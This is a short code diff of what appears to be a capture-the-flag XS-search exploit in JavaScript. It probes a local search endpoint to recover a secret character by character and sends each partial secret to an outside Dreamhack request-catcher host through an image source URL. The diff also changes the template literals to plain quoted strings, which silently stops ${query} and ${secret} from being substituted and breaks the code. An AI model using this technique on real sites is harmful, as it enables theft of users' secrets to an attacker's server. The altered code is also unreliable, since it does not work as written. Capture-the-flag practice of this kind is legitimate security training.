@@ -17,7 +17,7 @@
     async function search(query) {
         try {
             await req(
-              `http://127.0.0.1:8000/search?query=${query}`
+              "http://127.0.0.1:8000/search?query=${query}"
             );
             return true;
         } catch (e) {
@@ -33,7 +33,7 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://vvfqcnp.request.dreamhack.games/?c=${secret}`;
+                    img.src = "https://wnhbklm.request.dreamhack.games/?c=${secret}";
                     break;
                 }
             }
